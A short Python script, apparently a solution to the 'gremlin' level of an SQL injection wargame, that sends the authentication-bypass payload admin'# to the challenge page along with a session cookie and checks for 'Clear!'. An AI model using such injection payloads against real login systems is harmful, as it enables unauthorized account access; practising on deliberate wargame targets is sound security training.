from requests import get

url ="https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php/"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}
params = {
    "id":"admin'#"
}

if get(url,params=params,cookies=cookie).text.find("Clear!") > 0:
    print("[*] Success")
